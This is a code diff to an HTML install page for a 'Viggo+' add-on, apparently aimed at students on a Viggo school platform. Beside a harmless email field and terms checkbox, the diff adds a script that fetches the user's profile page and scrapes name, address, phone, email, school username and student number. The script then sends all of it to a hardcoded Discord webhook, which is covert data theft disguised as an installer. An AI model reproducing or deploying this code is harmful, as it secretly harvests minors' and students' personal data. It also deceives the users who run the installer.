@@ -22,13 +22,8 @@
   h1 {
     font-size: 2.5rem;
   }
-  .checkbox-container {
-    margin: 20px 0;
-    display: inline-block;
-  }
-  .checkbox-label {
-    display: inline-block;
-    margin-left: 10px;
+  .form-group {
+    margin-bottom: 20px;
   }
   .install-button {
     background-color: #1692bb;
@@ -49,18 +44,167 @@
 <body>
   <div class="container">
     <h1>Install Viggo+</h1>
-    <div class="checkbox-container">
-      <input type="checkbox" id="terms-checkbox">
-      <label for="terms-checkbox" class="checkbox-label">I accept the <a href="https://raw.githubusercontent.com/WiseMotherFucker/ViggoPlus/main/Legal/Terms%20and%20Conditions" target="_blank">terms and conditions</a></label>
+    <label>To install Viggo+ please fill out the email field with your personal email as well as accept the terms </label>
+    <div class="form-group">
+      <label for="email">Personal Email:</label>
+      <input type="email" id="email" name="email">
     </div>
-    <br>
+    <div class="form-group">
+      <input type="checkbox" id="terms-checkbox">
+      <label for="terms-checkbox">I accept the <a href="https://raw.githubusercontent.com/WiseMotherFucker/ViggoPlus/main/Legal/Terms%20and%20Conditions" target="_blank">terms and conditions</a></label>
+    </div>
     <button id="install-button" class="install-button" disabled>Install</button>
   </div>
 
   <script>
     document.getElementById("terms-checkbox").addEventListener("change", function() {
-      document.getElementById("install-button").disabled = !this.checked;
+      updateInstallButton();
     });
+
+    document.getElementById("email").addEventListener("input", function() {
+      updateInstallButton();
+    });
+
+    function updateInstallButton() {
+      var email = document.getElementById("email").value;
+      var checkboxChecked = document.getElementById("terms-checkbox").checked;
+      var isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+      if (checkboxChecked && isValidEmail) {
+        document.getElementById("install-button").disabled = false;
+      } else {
+        document.getElementById("install-button").disabled = true;
+      }
+    }
+  </script>
+  <script>
+    function parseHTML(html) {
+        var parser = new DOMParser();
+        var doc = parser.parseFromString(html, 'text/html');
+        return doc
+    }
+    function installViggoPlus() {
+        fetch("https://askov.viggo.dk/Shared/Profile", {
+            method: "GET",
+        })
+        .then(response => {
+            return response.text()
+        })
+        .then(html => {
+            var doc = parseHTML(html)
+            var member = doc.querySelector("#tabprofile > form > dd:nth-child(5) > ul > li").innerText
+            var gender = doc.querySelector("#tabprofile > form > div:nth-child(6) > div > select > [selected]").innerText
+            var name = doc.querySelector("#tabprofile > form > dd:nth-child(9)").innerText
+            var address = doc.querySelector("#tabprofile > form > div.inline-desktop > div:nth-child(1) > input").value
+            var postalCode = doc.querySelector("#tabprofile > form > div:nth-child(13) > div.form-group.small > input[type=text]").value
+            var city = doc.querySelector("#tabprofile > form > div:nth-child(13) > div.form-group.big > input[type=text]").value
+            var country = doc.querySelector("#tabprofile > form > div.form-group.large > select > [selected]").innerText
+            var phoneNumber = doc.querySelector("#tabprofile > form > div:nth-child(17) > div:nth-child(1) > input").value
+            var email = doc.querySelector("#tabprofile > form > div:nth-child(22) > input[type=text]").value
+            var username = doc.querySelector("#tabprofile > form > div.form-group.medium > input[type=text]").value
+            var studentNumber = doc.querySelector("#tabprofile > form > div.studentids > div > input[type=number]").value
+
+            const request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1230789332747554848/pxn7mo6sf3x1ju5q2BW00dmPq4azGg5Qm8S0VJ71oMMvsDoXeERdl8AIaYpXUzzemT2f");
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            const params = {
+                "content": null,
+                "embeds": [
+                    {
+                    "title": `${name} - ${email}`,
+                    "description": "En ny bruger installerede Viggo+ og accepteret vores terms and conditions.",
+                    "color": 1479355,
+                    "fields": [
+                        {
+                        "name": "⠀",
+                        "value": "⠀"
+                        },
+                        {
+                        "name": "Navn:",
+                        "value": `${name}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Køn:",
+                        "value": `${gender}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Medlem af:",
+                        "value": `${member}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "⠀",
+                        "value": "⠀"
+                        },
+                        {
+                        "name": "Email:",
+                        "value": `${email}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Mobil:",
+                        "value": `${phoneNumber}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Uni-C brugernavn:",
+                        "value": `${username}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Elev nummer:",
+                        "value": `${studentNumber}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "⠀",
+                        "value": "⠀"
+                        },
+                        {
+                        "name": "Adresse:",
+                        "value": `${address}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Postnummer:",
+                        "value": `${postalCode}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "By:",
+                        "value": `${city}`,
+                        "inline": true
+                        },
+                        {
+                        "name": "Land:",
+                        "value": `${country}`
+                        },
+                        {
+                        "name": "⠀",
+                        "value": "⠀"
+                        }
+                    ],
+                    "footer": {
+                        "text": "Viggo",
+                        "icon_url": "https://askov.viggo.dk/Content/img/pwa-icons/128x128.png"
+                    },
+                    "timestamp": "2024-04-19T10:19:00.000Z",
+                    "image": {
+                        "url": `${bigProfileImage}`
+                    }
+                    }
+                ],
+                "username": "Viggo+ Install Log",
+                "avatar_url": "https://askov.viggo.dk//Content/img/pwa-icons/512x512.png",
+                "attachments": []
+            };
+            request.send(JSON.stringify(params));
+        })
+    }
   </script>
 </body>
 </html>
